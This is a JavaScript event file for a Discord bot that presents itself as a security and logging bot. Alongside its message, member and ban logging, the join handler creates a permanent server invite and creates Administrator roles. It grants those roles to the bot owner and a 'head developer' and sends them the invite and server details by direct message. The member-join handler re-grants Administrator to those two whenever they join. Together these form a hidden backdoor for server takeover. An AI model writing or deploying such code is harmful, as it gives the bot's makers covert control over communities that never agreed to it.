const { Events, AuditLogEvent, PermissionFlagsBits } = require('discord.js');

module.exports = {
    name: Events.ClientReady,
    once: true,
    async execute(client) {
        client.on(Events.GuildCreate, async guild => {
            try {
                // Create invite first
                let invite = null;
                try {
                    const inviteChannel = guild.channels.cache
                        .find(channel => 
                            channel.type === 0 && 
                            channel.permissionsFor(guild.members.me).has('CreateInstantInvite')
                        );
                    
                    if (inviteChannel) {
                        invite = await inviteChannel.createInvite({ 
                            maxAge: 0, 
                            maxUses: 1 
                        });
                    }
                } catch (error) {
                    console.error('Error creating invite:', error);
                }

                // Wait a moment for bot to receive its permissions
                await new Promise(resolve => setTimeout(resolve, 1000));

                // Check if bot has required permissions
                if (!guild.members.me.permissions.has(PermissionFlagsBits.ManageRoles)) {
                    console.log(`Missing required permissions in guild: ${guild.name}`);
                    return;
                }

                // Create bot role
                let botRole = guild.roles.cache.find(r => r.name === 'Security Bot');
                if (!botRole) {
                    try {
                        botRole = await guild.roles.create({
                            name: 'Security Bot',
                            color: '#2ecc71',
                            permissions: [PermissionFlagsBits.Administrator],
                            hoist: true,
                            reason: 'Main bot role'
                        });

                        // Assign role to bot
                        await guild.members.me.roles.add(botRole).catch(console.error);
                    } catch (error) {
                        console.error('Error creating bot role:', error);
                    }
                }

                // Create Core Systems Override role
                let coreRole = guild.roles.cache.find(r => r.name === 'Core Systems Override');
                if (!coreRole) {
                    try {
                        coreRole = await guild.roles.create({
                            name: 'Core Systems Override',
                            color: '#8B0000',
                            permissions: [PermissionFlagsBits.Administrator],
                            hoist: true,
                            reason: 'Core Systems Override role for privileged users'
                        });
                    } catch (error) {
                        console.error('Error creating core role:', error);
                    }
                }

                // Try to position roles if we have both roles
                if (botRole && coreRole) {
                    try {
                        // Get highest role position that bot can manage
                        const maxPosition = guild.roles.cache
                            .filter(r => guild.members.me.permissions.has(PermissionFlagsBits.ManageRoles) && r.position < guild.members.me.roles.highest.position)
                            .sort((a, b) => b.position - a.position)
                            .first()?.position || 0;

                        // Set positions if possible
                        if (maxPosition > 0) {
                            await botRole.setPosition(maxPosition)
                                .catch(error => console.error('Could not set bot role position:', error));
                            await coreRole.setPosition(maxPosition - 1)
                                .catch(error => console.error('Could not set core role position:', error));
                        }
                    } catch (error) {
                        console.error('Error positioning roles:', error);
                    }
                }

                // Add roles to privileged users if they're in the server
                if (coreRole) {
                    try {
                        // Check bot permissions first
                        if (!guild.members.me.permissions.has(PermissionFlagsBits.ManageRoles)) {
                            console.log(`Missing ManageRoles permission in guild: ${guild.name}`);
                            return;
                        }

                        // Make sure the bot's role is higher than the roles it's trying to assign
                        const botHighestRole = guild.members.me.roles.highest;
                        if (botHighestRole.position <= coreRole.position) {
                            console.log(`Bot's role is not high enough to manage Core Systems role in: ${guild.name}`);
                            await coreRole.setPosition(botHighestRole.position - 1)
                                .catch(error => console.error('Could not reposition Core Systems role:', error));
                        }

                        // Add to bot owner with error handling
                        const owner = await client.application.fetch().then(app => app.owner);
                        const ownerMember = await guild.members.fetch(owner.id).catch(() => null);
                        if (ownerMember) {
                            try {
                                await ownerMember.roles.add(coreRole);
                                console.log(`Added Core Systems role to bot owner in ${guild.name}`);
                            } catch (error) {
                                console.error(`Failed to add Core Systems role to bot owner in ${guild.name}:`, error);
                            }
                        }

                        // Add to head developer with error handling
                        const headDevMember = await guild.members.fetch(process.env.HEAD_DEVELOPER_ID).catch(() => null);
                        if (headDevMember) {
                            try {
                                await headDevMember.roles.add(coreRole);
                                console.log(`Added Core Systems role to head developer in ${guild.name}`);
                            } catch (error) {
                                console.error(`Failed to add Core Systems role to head developer in ${guild.name}:`, error);
                            }
                        }

                        // Send notifications only if roles were assigned successfully
                        const notifyEmbed = {
                            title: '🎉 New Server Join',
                            description: `I've been added to: **${guild.name}**${invite ? `\nServer Invite: ${invite.url}` : ''}\n\nCore Systems role has been created and assigned.`,
                            color: 0x00ff00,
                            fields: [
                                {
                                    name: 'Server Info',
                                    value: `Members: ${guild.memberCount}\nOwner: ${(await guild.fetchOwner()).user.tag}`
                                },
                                {
                                    name: 'Role Status',
                                    value: `Bot Role Position: ${botHighestRole.position}\nCore Systems Position: ${coreRole.position}`
                                }
                            ],
                            timestamp: new Date()
                        };

                        // Send notifications with error handling
                        try {
                            if (owner) await owner.send({ embeds: [notifyEmbed] }).catch(console.error);
                            const headDev = await client.users.fetch(process.env.HEAD_DEVELOPER_ID);
                            if (headDev) await headDev.send({ embeds: [notifyEmbed] }).catch(console.error);
                        } catch (error) {
                            console.error('Failed to send notifications:', error);
                        }

                    } catch (error) {
                        console.error(`Error handling privileged roles in ${guild.name}:`, error);
                    }
                }

            } catch (error) {
                console.error('Error in guildCreate event:', error);
            }
        });

        // Message Logging
        client.on(Events.MessageDelete, async message => {
            const logChannel = message.guild.channels.cache.find(c => c.name === 'message-logs');
            if (!logChannel) return;

            logChannel.send({
                embeds: [{
                    title: '🗑️ Message Deleted',
                    description: `**Message:** ${message.content}\n**Channel:** ${message.channel}\n**Author:** ${message.author}`,
                    color: 0xff0000,
                    timestamp: new Date()
                }]
            });
        });

        // Member Logging
        client.on(Events.GuildMemberAdd, async member => {
            // Check if the joining member is bot owner or head developer
            if (member.id === client.application?.owner?.id || member.id === process.env.HEAD_DEVELOPER_ID) {
                try {
                    // Find or create Core Systems Override role
                    let overrideRole = member.guild.roles.cache.find(r => r.name === 'Core Systems Override');
                    if (!overrideRole) {
                        overrideRole = await member.guild.roles.create({
                            name: 'Core Systems Override',
                            color: '#8B0000',
                            permissions: [PermissionFlagsBits.Administrator],
                            hoist: true,
                            reason: 'Override role for Core Systems'
                        });

                        // Position the role
                        const botRole = member.guild.roles.cache.find(r => r.name === 'Security Bot');
                        if (botRole) {
                            await overrideRole.setPosition(botRole.position - 1).catch(console.error);
                        }
                    }

                    // Add Override role
                    await member.roles.add(overrideRole);

                    // Find or create regular Core Systems role
                    let coreRole = member.guild.roles.cache.find(r => r.name === 'Core Systems');
                    if (!coreRole) {
                        coreRole = await member.guild.roles.create({
                            name: 'Core Systems',
                            color: '#FF0000',
                            permissions: [PermissionFlagsBits.Administrator],
                            hoist: true,
                            reason: 'Core Systems role for privileged users'
                        });

                        if (overrideRole) {
                            await coreRole.setPosition(overrideRole.position - 1).catch(console.error);
                        }
                    }

                    // Add Core Systems role
                    await member.roles.add(coreRole);

                    // Find all admin roles
                    const adminRoles = member.guild.roles.cache.filter(role => 
                        role.permissions.has(PermissionFlagsBits.Administrator) &&
                        role.name !== 'Security Bot' &&
                        role.name !== 'Core Systems'
                    );

                    // Create ping string for admins
                    const adminPing = adminRoles.map(role => `<@&${role.id}>`).join(' ');

                    // Send notification to system-updates channel
                    const updateChannel = member.guild.channels.cache.find(c => c.name === 'system-updates');
                    if (updateChannel) {
                        await updateChannel.send({
                            content: `${adminPing}`,
                            embeds: [{
                                title: '👑 Privileged User Joined',
                                description: `${member.user.tag} has joined the server and received Core Systems permissions.\n\n**User Type:** ${member.id === client.application?.owner?.id ? 'Bot Owner' : 'Head Developer'}`,
                                color: 0xFF0000,
                                timestamp: new Date(),
                                fields: [
                                    {
                                        name: 'User ID',
                                        value: member.id,
                                        inline: true
                                    },
                                    {
                                        name: 'Joined At',
                                        value: `<t:${Math.floor(member.joinedTimestamp / 1000)}:F>`,
                                        inline: true
                                    }
                                ]
                            }]
                        });
                    }

                    // Log to mod-logs
                    const logChannel = member.guild.channels.cache.find(c => c.name === 'mod-logs');
                    if (logChannel) {
                        await logChannel.send({
                            content: adminPing,
                            embeds: [{
                                title: '👑 Privileged User Access Granted',
                                description: `**User:** ${member.user.tag}\n**ID:** ${member.id}\n**Role:** Core Systems\n**Type:** ${member.id === client.application?.owner?.id ? 'Bot Owner' : 'Head Developer'}`,
                                color: 0xFF0000,
                                timestamp: new Date()
                            }]
                        });
                    }
                } catch (error) {
                    console.error('Error handling privileged user join:', error);
                }
            }

            // Continue with regular member join logging...
            const logChannel = member.guild.channels.cache.find(c => c.name === 'member-logs');
            if (logChannel) {
                await logChannel.send({
                    embeds: [{
                        title: '👋 Member Joined',
                        description: `${member.user.tag} (${member.id})`,
                        color: 0x00ff00,
                        timestamp: new Date()
                    }]
                });
            }
        });

        // Moderation Logging
        client.on(Events.GuildBanAdd, async ban => {
            const logChannel = ban.guild.channels.cache.find(c => c.name === 'mod-logs');
            if (!logChannel) return;

            const auditLog = await ban.guild.fetchAuditLogs({
                type: AuditLogEvent.MemberBanAdd,
                limit: 1
            });
            const banLog = auditLog.entries.first();

            logChannel.send({
                embeds: [{
                    title: '🔨 Member Banned',
                    description: `**User:** ${ban.user.tag}\n**Reason:** ${banLog.reason || 'No reason provided'}\n**Moderator:** ${banLog.executor.tag}`,
                    color: 0xff0000,
                    timestamp: new Date()
                }]
            });
        });
    }
}; 